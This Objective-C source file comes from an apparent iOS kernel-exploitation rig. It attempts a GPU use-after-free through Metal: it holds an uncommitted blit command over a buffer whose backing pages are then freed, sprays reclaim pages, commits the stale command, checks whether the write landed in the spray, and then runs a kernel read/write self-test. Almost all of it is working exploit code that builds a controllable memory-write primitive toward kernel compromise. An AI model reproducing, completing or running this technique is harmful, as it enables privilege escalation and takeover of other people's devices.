//
//  P137RouteCLatch.m — ROUTE C: the REAL latched kick (held-blit UAF). p137.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Built from B1_B2_LabTest's own internals, read in full: the pack's
//  noop deallocator means OUR vm pages survive the MTLBuffer release; the
//  kernel-side mapping goes at the commitUnmaps path; the held-command
//  commit = the submission over the deleted record. The missing step of
//  every b1b2 phase chain so far. Laws honored: dlsym IOKit only, no
//  kernel AGX cites, the NQ +0x10=0 law (no completion waits).
//

#import "P137RouteCLatch.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabBandit.h"
#import "P007KreadLane.h"
#import "P007Board.h"

#import <Metal/Metal.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <stdarg.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P137_BUILD  @"p137-latch-v2-backingfree"
#define P137_PAGE   0x4000
#define P137_SPRAY  48

static NSMutableString *g_buf; static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }
static NSString *P137R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

static void p137_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p137", arms, 1, &sr, 0, "p137 latch auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p137", 0, outcome);
}

@implementation P137RouteCLatch

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p137_latch_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p137 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P137_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[latch law] the b1b2 noop-deallocator law: our vm pages survive");
    L(@"  the MTLBuffer release; the commitUnmaps undo the kernel-side");
    L(@"  GVA binding. The held-command commit = the submission over the");
    L(@"  DELETED record: retention law OR the stale-write - decided by");
    L(@"  where 0xBB lands (old pages vs spray vs neither).");
    L(@"[!] PANIC-POSSIBLE; one tap per force-quit.");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p137"];
    if (stop) { L(stop); p137_bandit("gated"); return P137R(); }

    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { L(@"[-] no Metal device"); p137_bandit("nodev"); return P137R(); }
    id<MTLCommandQueue> q = [dev newCommandQueue];
    if (!q) { L(@"[-] no queue"); p137_bandit("noqueue"); return P137R(); }

    /* ---- 1: our pages + the bytesNoCopy buffer (b1b2 law) ---- */
    vm_address_t pages = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &pages, P137_PAGE,
                                   VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS || !pages) {
        L(@"[-] vm_allocate failed"); p137_bandit("noalloc"); return P137R();
    }
    memset((void *)pages, 0xAA, P137_PAGE);
    id<MTLBuffer> buf = [dev newBufferWithBytesNoCopy:(void *)pages
                                               length:P137_PAGE
                                              options:MTLResourceStorageModeShared
                                          deallocator:^(void *ptr, NSUInteger n) {
        (void)ptr; (void)n;   /* the b1b2 noop-deallocator law: pages live */
    }];
    if (!buf) { vm_deallocate(mach_task_self(), pages, P137_PAGE);
                L(@"[-] bytesNoCopy refused"); p137_bandit("nobuffer"); return P137R(); }
    Lf(@"[1] buffer over our pages ok (0x%llx @0x%llx, 0xAA-fill)",
       (unsigned long long)P137_PAGE, (unsigned long long)pages);

    /* ---- 2: the held command: encode 0xBB, END, DO NOT COMMIT ---- */
    id<MTLCommandBuffer> held = [q commandBuffer];
    id<MTLBlitCommandEncoder> e = [held blitCommandEncoder];
    [e fillBuffer:buf range:NSMakeRange(0, P137_PAGE) value:0xBB];
    [e endEncoding];
    L(@"[2] held command encoded (fill 0xBB) - NOT committed yet.");

    /* ---- 3: drop the buffer AND the backing (the true stale state) --
       v1 proved the kernel ACCEPTS a command over the deleted record
       and the GPU executed through the binding (0xBB landed in our
       live old pages). v2 makes the target die: the backing itself is
       vm_deallocated - so the stale GVA points at FREED memory, and
       the 0xCC spray then decides who reclaims it.                    */
    buf = nil;
    kern_return_t frkr = vm_deallocate(mach_task_self(), pages, P137_PAGE);
    Lf(@"[3v2] MTLBuffer released + the BACKING vm_deallocated (kr=0x%x) ="
       @" the stale GVA now dangles over freed pages.", (unsigned)frkr);

    /* ---- 4: the spray ---- */
    void *spray[P137_SPRAY]; uint32_t ns = 0;
    for (int i = 0; i < P137_SPRAY; i++) {
        vm_address_t sp = 0;
        if (vm_allocate(mach_task_self(), &sp, P137_PAGE, VM_FLAGS_ANYWHERE) != KERN_SUCCESS)
            break;
        memset((void *)sp, 0xCC, P137_PAGE);
        spray[ns++] = (void *)sp;
    }
    Lf(@"[4] spray: %u pages x 0x4000 @0xCC", ns);

    /* ---- 5: COMMIT the held command ---- */
    L(@"[5] COMMITTING the held command over the deleted record - IN FLIGHT.");
    [held commit];
    /* the honest settle: no completion wait (the NQ law); a bounded sleep */
    [NSThread sleepForTimeInterval:0.3];
    Lf(@"[5] held command committed; cb.status=%ld (0=pending,1=committed)", (long)held.status);

    /* ---- 6: the verdict scans (the backing was freed in v2; the old-
       page scan is SKIPPED by law - touching freed pages would fault
       our own process. The spray is the only target.                  */
    L(@"=== VERDICT: where did the 0xBB land? (v2: the backing is dead -");
    L(@"    only the spray can answer) ===");
    uint32_t hitOld = 0, hitSpray = 0;
    for (uint32_t i = 0; i < ns; i++) {
        for (uint32_t j = 0; j < P137_PAGE; j++)
            if (((uint8_t *)spray[i])[j] == 0xBB) {
                Lf(@"   HIT spray[%u] off=0x%x", i, j);
                hitSpray++; break;
            }
    }
    /* (the v1 hitOld branch is retired in v2 - backing freed) */
    L(@"   the unmap: the GPU executed through the stale GVA binding.");
    if (hitSpray) Lf(@"   RECLAIM-HIT in %u SPRAY PAGES = 0xBB over 0xCC = the"
                     @" stale record rode the reclaimed backing = THE AIMABLE-"
                     @" WRITE STATE (the write went where the allocator put us"
                     @" = controllable by the spray policy).", hitSpray);
    if (!hitOld && !hitSpray) {
        L(@"   NEITHER = the retention/sanity law: Metal retained the");
        L(@"   resource until the command completed (or the submit refused).");
        L(@"   status=%ld + no lands = the honest HOLD; next levers: the");
        L(@"   raw sel-25 submission path, or TWO held commands with the");
        L(@"   cross-buffer retention gap.");
    }

    /* the honest KRW self-test tail */
    L(@"=== STAGE GATE (honest KRW self-test) ===");
    if (!P007LaneLive()) {
        L(@"  lane: CLOSED -> no receipt this session. Honest.");
        p137_bandit(hitSpray ? "lane-closed-with-hits" :
                    hitOld ? "lane-closed-stale-write" : "lane-closed-clean");
    } else {
        uint64_t kb = P007LaneKbase();
        if (kb && P007LaneKRead32(kb) == 0xfeedfacfULL) {
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx)", kb);
            p137_bandit("selftest-read-pass");
        } else {
            L(@"  KRW SELF-TEST READ: FAIL/HOLD");
            p137_bandit("selftest-read-fail");
        }
        Lf(@"  board: %@", [[P007Board shared] kreadSignal]);
    }
    for (uint32_t i = 0; i < ns; i++) vm_deallocate(mach_task_self(),
                                                    (vm_address_t)spray[i],
                                                    P137_PAGE);
    Lf(@"=== p137 end %@ ===", LabLocalMilitaryNow());
    return P137R();
}

@end